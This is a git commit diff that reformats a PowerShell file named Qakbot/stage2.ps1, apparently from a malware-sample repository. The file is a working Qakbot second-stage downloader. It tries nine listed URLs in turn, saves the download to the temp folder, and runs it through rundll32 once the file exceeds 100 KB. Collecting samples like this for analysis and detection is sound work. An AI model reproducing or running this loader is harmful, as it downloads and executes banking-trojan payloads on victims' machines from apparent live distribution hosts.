557d8dd7c2bbb9fe5b06fdfdac97b04e6b977fc5
xRY0D4N <106463794+xRY0D4N@users.noreply.github.com>
2023-04-05 19:32:39 +0300

    Update stage2.ps1

--- Qakbot/stage2.ps1
+++ Qakbot/stage2.ps1
@@ -1,1 +1,12 @@
-Start-Sleep -Seconds 2;$haemathermSoother = ("https://centerkick.com/IC5EQ8/pW1kEKJHc0N,https://agtendelperu.com/FPu0Fa/XIuGtqYuU68m,https://graficalevi.com.br/0p6P/H4XFCAEi2vr,http://rosewoodlaminates.com/hea/E3TVzcC,https://capitalperurrhh.com/vQ1iQg/YagSNaPli9a,https://propertynear.co.uk/QyYWyp/aN3AuM6Lk,https://chimpcity.com/h7e/lATjasvb,https://kmphi.com/FWovmB/VjjDgiFzt,https://theshirtsummit.com/MwBGSm/AxaCZJozW").split(",");foreach ($outrap in $haemathermSoother) {try {wget $outrap -TimeoutSec 20 -O $env:TEMP\Outdistances.Veilmaking;if ((Get-Item $env:TEMP\Outdistances.Veilmaking).length -ge 100000) {start rundll32 $env:TEMP\\Outdistances.Veilmaking,X555;break;}}catch {Start-Sleep -Seconds 2;}}
+Start-Sleep -Seconds 2;
+$haemathermSoother = ("https://centerkick.com/IC5EQ8/pW1kEKJHc0N,
+https://agtendelperu.com/FPu0Fa/XIuGtqYuU68m,
+https://graficalevi.com.br/0p6P/H4XFCAEi2vr,
+http://rosewoodlaminates.com/hea/E3TVzcC,
+https://capitalperurrhh.com/vQ1iQg/YagSNaPli9a,
+https://propertynear.co.uk/QyYWyp/aN3AuM6Lk,
+https://chimpcity.com/h7e/lATjasvb,
+https://kmphi.com/FWovmB/VjjDgiFzt,
+https://theshirtsummit.com/MwBGSm/AxaCZJozW").split(",");
+foreach ($outrap in $haemathermSoother) {try {wget $outrap -TimeoutSec 20 -O $env:TEMP\Outdistances.Veilmaking;
+if ((Get-Item $env:TEMP\Outdistances.Veilmaking).length -ge 100000) {start rundll32 $env:TEMP\\Outdistances.Veilmaking,X555;break;}}catch {Start-Sleep -Seconds 2;}}
